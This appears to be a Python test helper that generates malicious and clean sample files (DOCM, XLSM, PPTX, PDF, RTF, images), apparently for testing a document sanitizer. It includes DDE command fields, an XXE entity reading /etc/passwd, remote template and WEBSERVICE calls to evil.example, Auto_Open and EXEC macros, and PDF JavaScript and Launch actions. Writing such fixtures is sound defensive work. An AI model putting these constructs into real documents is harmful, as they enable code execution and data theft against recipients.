"""테스트용 악성/정상 샘플 생성기."""

from __future__ import annotations

import io
import zipfile

import pikepdf
from PIL import Image
from PIL.PngImagePlugin import PngInfo

CT_NS = "http://schemas.openxmlformats.org/package/2006/content-types"
PR_NS = "http://schemas.openxmlformats.org/package/2006/relationships"
R_NS = "http://schemas.openxmlformats.org/officeDocument/2006/relationships"
W_NS = "http://schemas.openxmlformats.org/wordprocessingml/2006/main"
S_NS = "http://schemas.openxmlformats.org/spreadsheetml/2006/main"
REL = "http://schemas.openxmlformats.org/officeDocument/2006/relationships"


def make_zip(files: dict[str, bytes | str]) -> bytes:
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
        for name, content in files.items():
            zf.writestr(name, content)
    return buf.getvalue()


def png_bytes(with_meta: bool = False, trailing: bytes = b"") -> bytes:
    img = Image.new("RGB", (8, 8), (200, 30, 30))
    buf = io.BytesIO()
    info = None
    if with_meta:
        info = PngInfo()
        info.add_text("Author", "attacker")
        info.add_text("Comment", "<script>alert(1)</script>")
    img.save(buf, format="PNG", pnginfo=info)
    return buf.getvalue() + trailing


def jpeg_bytes(with_exif: bool = False) -> bytes:
    img = Image.new("RGB", (8, 8), (10, 120, 200))
    buf = io.BytesIO()
    if with_exif:
        exif = Image.Exif()
        exif[0x010F] = "EvilCam"       # Make
        exif[0x0131] = "payload-here"  # Software
        img.save(buf, format="JPEG", exif=exif)
    else:
        img.save(buf, format="JPEG")
    return buf.getvalue()


# ---------------------------------------------------------------------- DOCX
def malicious_docm() -> bytes:
    content_types = f"""<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Types xmlns="{CT_NS}">
  <Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Default Extension="xml" ContentType="application/xml"/>
  <Default Extension="bin" ContentType="application/vnd.ms-office.vbaProject"/>
  <Default Extension="png" ContentType="image/png"/>
  <Override PartName="/word/document.xml" ContentType="application/vnd.ms-word.document.macroEnabled.main+xml"/>
  <Override PartName="/word/settings.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.settings+xml"/>
  <Override PartName="/word/vbaData.xml" ContentType="application/vnd.ms-word.vbaData+xml"/>
  <Override PartName="/word/embeddings/oleObject1.bin" ContentType="application/vnd.openxmlformats-officedocument.oleObject"/>
  <Override PartName="/docProps/core.xml" ContentType="application/vnd.openxmlformats-package.core-properties+xml"/>
  <Override PartName="/docProps/custom.xml" ContentType="application/vnd.openxmlformats-officedocument.custom-properties+xml"/>
</Types>"""
    root_rels = f"""<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="{PR_NS}">
  <Relationship Id="rId1" Type="{REL}/officeDocument" Target="word/document.xml"/>
  <Relationship Id="rId2" Type="http://schemas.openxmlformats.org/package/2006/relationships/metadata/core-properties" Target="docProps/core.xml"/>
  <Relationship Id="rId3" Type="{REL}/custom-properties" Target="docProps/custom.xml"/>
</Relationships>"""
    doc_rels = f"""<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="{PR_NS}">
  <Relationship Id="rId1" Type="http://schemas.microsoft.com/office/2006/relationships/vbaProject" Target="vbaProject.bin"/>
  <Relationship Id="rId2" Type="{REL}/settings" Target="settings.xml"/>
  <Relationship Id="rId3" Type="{REL}/hyperlink" Target="https://example.com/" TargetMode="External"/>
  <Relationship Id="rId4" Type="{REL}/hyperlink" Target="file://attacker/share/evil.exe" TargetMode="External"/>
  <Relationship Id="rId5" Type="{REL}/oleObject" Target="embeddings/oleObject1.bin"/>
  <Relationship Id="rId6" Type="{REL}/image" Target="media/image1.png"/>
  <Relationship Id="rId7" Type="{REL}/image" Target="\\\\10.0.0.1\\share\\track.png" TargetMode="External"/>
</Relationships>"""
    vba_rels = f"""<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="{PR_NS}">
  <Relationship Id="rId1" Type="http://schemas.microsoft.com/office/2006/relationships/wordVbaData" Target="vbaData.xml"/>
</Relationships>"""
    settings_rels = f"""<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="{PR_NS}">
  <Relationship Id="rId1" Type="{REL}/attachedTemplate" Target="http://evil.example/template.dotm" TargetMode="External"/>
</Relationships>"""
    settings = f"""<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<w:settings xmlns:w="{W_NS}" xmlns:r="{R_NS}"><w:attachedTemplate r:id="rId1"/></w:settings>"""
    document = f"""<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<w:document xmlns:w="{W_NS}" xmlns:r="{R_NS}" xmlns:o="urn:schemas-microsoft-com:office:office"
  xmlns:v="urn:schemas-microsoft-com:vml" xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
<w:body>
  <w:p><w:r><w:t>안전한 본문</w:t></w:r></w:p>
  <w:p><w:hyperlink r:id="rId3"><w:r><w:t>정상 링크</w:t></w:r></w:hyperlink></w:p>
  <w:p><w:hyperlink r:id="rId4"><w:r><w:t>악성 링크</w:t></w:r></w:hyperlink></w:p>
  <w:p>
    <w:r><w:fldChar w:fldCharType="begin"/></w:r>
    <w:r><w:instrText xml:space="preserve"> DD</w:instrText></w:r>
    <w:r><w:instrText xml:space="preserve">EAUTO c:\\\\windows\\\\system32\\\\cmd.exe "/k calc.exe"</w:instrText></w:r>
    <w:r><w:fldChar w:fldCharType="separate"/></w:r>
    <w:r><w:t>결과</w:t></w:r>
    <w:r><w:fldChar w:fldCharType="end"/></w:r>
  </w:p>
  <w:p><w:fldSimple w:instr=" INCLUDEPICTURE &quot;http://evil.example/x.png&quot; "><w:r><w:t>그림</w:t></w:r></w:fldSimple></w:p>
  <w:p><w:fldSimple w:instr=" PAGE "><w:r><w:t>1</w:t></w:r></w:fldSimple></w:p>
  <w:p><w:r><w:object><v:shape id="s1"/><o:OLEObject Type="Embed" ProgID="Package" r:id="rId5"/></w:object></w:r></w:p>
  <w:p><w:r><w:drawing><a:blip r:embed="rId6"/><a:blip r:link="rId7"/></w:drawing></w:r></w:p>
</w:body></w:document>"""
    core = """<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<cp:coreProperties xmlns:cp="http://schemas.openxmlformats.org/package/2006/metadata/core-properties"
 xmlns:dc="http://purl.org/dc/elements/1.1/"><dc:creator>홍길동</dc:creator><cp:lastModifiedBy>attacker</cp:lastModifiedBy></cp:coreProperties>"""
    return make_zip({
        "[Content_Types].xml": content_types,
        "_rels/.rels": root_rels,
        "word/document.xml": document,
        "word/_rels/document.xml.rels": doc_rels,
        "word/settings.xml": settings,
        "word/_rels/settings.xml.rels": settings_rels,
        "word/vbaProject.bin": b"\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1" + b"Attribute VB_Name AutoOpen Shell" * 4,
        "word/_rels/vbaProject.bin.rels": vba_rels,
        "word/vbaData.xml": '<?xml version="1.0"?><wne:vbaSuppData xmlns:wne="http://schemas.microsoft.com/office/word/2006/wordml"/>',
        "word/embeddings/oleObject1.bin": b"\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1MZ-payload",
        "word/media/image1.png": png_bytes(with_meta=True, trailing=b"PK\x03\x04" + b"A" * 64),
        "docProps/core.xml": core,
        "docProps/custom.xml": '<?xml version="1.0"?><Properties xmlns="http://schemas.openxmlformats.org/officeDocument/2006/custom-properties"/>',
    })


def xxe_docx() -> bytes:
    doc = f"""<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<w:document xmlns:w="{W_NS}"><w:body><w:p><w:r><w:t>&xxe;</w:t></w:r></w:p></w:body></w:document>"""
    return make_zip({
        "[Content_Types].xml": f'<?xml version="1.0"?><Types xmlns="{CT_NS}"><Default Extension="xml" ContentType="application/xml"/></Types>',
        "word/document.xml": doc,
    })


# ---------------------------------------------------------------------- XLSX
def malicious_xlsm() -> bytes:
    content_types = f"""<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Types xmlns="{CT_NS}">
  <Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Default Extension="xml" ContentType="application/xml"/>
  <Override PartName="/xl/workbook.xml" ContentType="application/vnd.ms-excel.sheet.macroEnabled.main+xml"/>
  <Override PartName="/xl/worksheets/sheet1.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.worksheet+xml"/>
  <Override PartName="/xl/macrosheets/sheet2.xml" ContentType="application/vnd.ms-excel.macrosheet+xml"/>
  <Override PartName="/xl/externalLinks/externalLink1.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.externalLink+xml"/>
</Types>"""
    wb_rels = f"""<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="{PR_NS}">
  <Relationship Id="rId1" Type="{REL}/worksheet" Target="worksheets/sheet1.xml"/>
  <Relationship Id="rId2" Type="http://schemas.microsoft.com/office/2006/relationships/xlMacrosheet" Target="macrosheets/sheet2.xml"/>
  <Relationship Id="rId3" Type="{REL}/externalLink" Target="externalLinks/externalLink1.xml"/>
</Relationships>"""
    workbook = f"""<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<workbook xmlns="{S_NS}" xmlns:r="{R_NS}">
  <sheets><sheet name="Sheet1" sheetId="1" r:id="rId1"/><sheet name="Macro1" sheetId="2" r:id="rId2"/></sheets>
  <externalReferences><externalReference r:id="rId3"/></externalReferences>
  <definedNames><definedName name="_xlnm.Auto_Open">Macro1!$A$1</definedName><definedName name="Data">Sheet1!$A$1</definedName></definedNames>
</workbook>"""
    sheet1 = f"""<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<worksheet xmlns="{S_NS}"><sheetData>
  <row r="1"><c r="A1"><f>SUM(1,2)</f><v>3</v></c></row>
  <row r="2"><c r="A2"><f>cmd|'/C calc.exe'!A0</f><v>0</v></c></row>
  <row r="3"><c r="A3"><f>WEBSERVICE("http://evil.example/?"&amp;A1)</f><v>0</v></c></row>
</sheetData></worksheet>"""
    macro = f'<?xml version="1.0"?><xm:macrosheet xmlns:xm="http://schemas.microsoft.com/office/excel/2006/main"><sheetData xmlns="{S_NS}"><row r="1"><c r="A1"><f>EXEC("calc.exe")</f></c></row></sheetData></xm:macrosheet>'
    ext = f'<?xml version="1.0"?><externalLink xmlns="{S_NS}"><ddeLink ddeService="cmd" ddeTopic="/c calc"/></externalLink>'
    return make_zip({
        "[Content_Types].xml": content_types,
        "_rels/.rels": f'<?xml version="1.0"?><Relationships xmlns="{PR_NS}"><Relationship Id="rId1" Type="{REL}/officeDocument" Target="xl/workbook.xml"/></Relationships>',
        "xl/workbook.xml": workbook,
        "xl/_rels/workbook.xml.rels": wb_rels,
        "xl/worksheets/sheet1.xml": sheet1,
        "xl/macrosheets/sheet2.xml": macro,
        "xl/externalLinks/externalLink1.xml": ext,
    })


# ---------------------------------------------------------------------- PPTX
def malicious_pptx() -> bytes:
    slide = f"""<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<p:sld xmlns:p="http://schemas.openxmlformats.org/presentationml/2006/main"
 xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main" xmlns:r="{R_NS}">
<p:cSld><p:spTree>
  <p:sp><p:nvSpPr><p:cNvPr id="2" name="btn"><a:hlinkClick r:id="rId2" action="ppaction://program"/></p:cNvPr></p:nvSpPr></p:sp>
  <p:sp><p:nvSpPr><p:cNvPr id="3" name="hover"><a:hlinkMouseOver r:id="" action="ppaction://macro?name=Evil"/></p:cNvPr></p:nvSpPr></p:sp>
  <p:sp><p:nvSpPr><p:cNvPr id="4" name="ok"><a:hlinkClick r:id="" action="ppaction://hlinkshowjump?jump=nextslide"/></p:cNvPr></p:nvSpPr></p:sp>
</p:spTree></p:cSld></p:sld>"""
    slide_rels = f"""<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="{PR_NS}">
  <Relationship Id="rId2" Type="{REL}/hyperlink" Target="c:\\windows\\system32\\calc.exe" TargetMode="External"/>
</Relationships>"""
    ct = f"""<?xml version="1.0"?><Types xmlns="{CT_NS}">
  <Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Default Extension="xml" ContentType="application/xml"/>
  <Override PartName="/ppt/presentation.xml" ContentType="application/vnd.openxmlformats-officedocument.presentationml.slideshow.main+xml"/>
</Types>"""
    return make_zip({
        "[Content_Types].xml": ct,
        "_rels/.rels": f'<?xml version="1.0"?><Relationships xmlns="{PR_NS}"><Relationship Id="rId1" Type="{REL}/officeDocument" Target="ppt/presentation.xml"/></Relationships>',
        "ppt/presentation.xml": '<?xml version="1.0"?><p:presentation xmlns:p="http://schemas.openxmlformats.org/presentationml/2006/main"/>',
        "ppt/slides/slide1.xml": slide,
        "ppt/slides/_rels/slide1.xml.rels": slide_rels,
    })


# ---------------------------------------------------------------------- PDF
def malicious_pdf() -> bytes:
    pdf = pikepdf.new()
    pdf.add_blank_page(page_size=(200, 200))
    page = pdf.pages[0]

    js = pdf.make_indirect(pikepdf.Dictionary(S=pikepdf.Name.JavaScript, JS=pikepdf.String("app.alert('pwned');")))
    pdf.Root.OpenAction = js
    pdf.Root.AA = pikepdf.Dictionary(WC=pikepdf.Dictionary(S=pikepdf.Name.JavaScript, JS=pikepdf.String("x()")))

    launch_link = pikepdf.Dictionary(
        Type=pikepdf.Name.Annot, Subtype=pikepdf.Name.Link, Rect=[0, 0, 50, 50],
        A=pikepdf.Dictionary(S=pikepdf.Name.Launch, F=pikepdf.String("cmd.exe"),
                             Next=pikepdf.Dictionary(S=pikepdf.Name.URI, URI=pikepdf.String("https://ok.example/"))),
    )
    good_link = pikepdf.Dictionary(
        Type=pikepdf.Name.Annot, Subtype=pikepdf.Name.Link, Rect=[50, 0, 100, 50],
        A=pikepdf.Dictionary(S=pikepdf.Name.URI, URI=pikepdf.String("https://example.com/")),
    )
    bad_uri = pikepdf.Dictionary(
        Type=pikepdf.Name.Annot, Subtype=pikepdf.Name.Link, Rect=[100, 0, 150, 50],
        A=pikepdf.Dictionary(S=pikepdf.Name.URI, URI=pikepdf.String("file:///c:/windows/system32/calc.exe")),
    )
    ef_stream = pdf.make_stream(b"MZ\x90\x00 evil executable", Type=pikepdf.Name.EmbeddedFile)
    filespec = pikepdf.Dictionary(Type=pikepdf.Name.Filespec, F=pikepdf.String("evil.exe"),
                                  EF=pikepdf.Dictionary(F=ef_stream))
    attach = pikepdf.Dictionary(Type=pikepdf.Name.Annot, Subtype=pikepdf.Name.FileAttachment,
                                Rect=[150, 0, 200, 50], FS=filespec)
    page.obj.Annots = pdf.make_indirect(pikepdf.Array([
        pdf.make_indirect(launch_link), pdf.make_indirect(good_link),
        pdf.make_indirect(bad_uri), pdf.make_indirect(attach),
    ]))
    page.obj.AA = pikepdf.Dictionary(O=pikepdf.Dictionary(S=pikepdf.Name.JavaScript, JS=pikepdf.String("y()")))

    pdf.Root.Names = pikepdf.Dictionary(
        JavaScript=pikepdf.Dictionary(Names=[pikepdf.String("a"), pdf.make_indirect(
            pikepdf.Dictionary(S=pikepdf.Name.JavaScript, JS=pikepdf.String("z()")))]),
        EmbeddedFiles=pikepdf.Dictionary(Names=[pikepdf.String("evil.exe"), pdf.make_indirect(filespec)]),
    )
    pdf.Root.AcroForm = pikepdf.Dictionary(Fields=[], XFA=pdf.make_stream(b"<xdp:xdp/>"))
    with pdf.open_metadata(set_pikepdf_as_editor=False) as meta:
        meta["dc:creator"] = ["attacker"]
    pdf.docinfo["/Author"] = "attacker"

    buf = io.BytesIO()
    pdf.save(buf)
    return buf.getvalue() + b"\n" + b"HIDDEN-PAYLOAD" * 10


def clean_pdf() -> bytes:
    pdf = pikepdf.new()
    pdf.add_blank_page(page_size=(100, 100))
    buf = io.BytesIO()
    pdf.save(buf)
    return buf.getvalue()


# ---------------------------------------------------------------------- RTF
def malicious_rtf() -> bytes:
    return (
        rb"{\rtf1\ansi{\*\template http://evil.example/t.dotm}"
        rb"{\fonttbl{\f0 Arial;}}\f0 Hello \{world\}"
        rb"{\object\objemb\objupdate{\*\objclass Equation.3}{\*\objdata 0105000002000000"
        rb"{\bin4 }}}}}}}"  # \bin 뒤 4바이트는 중괄호지만 데이터로 취급되어야 함
        rb"{\field{\*\fldinst DDEAUTO c:\\windows\\system32\\cmd.exe \"/c calc\"}{\fldrslt ok}}"
        rb"{\field{\*\fldinst PAGE}{\fldrslt 1}}"
        rb"\par end}"
        b"\x00\x00MZ-appended-payload"
    )
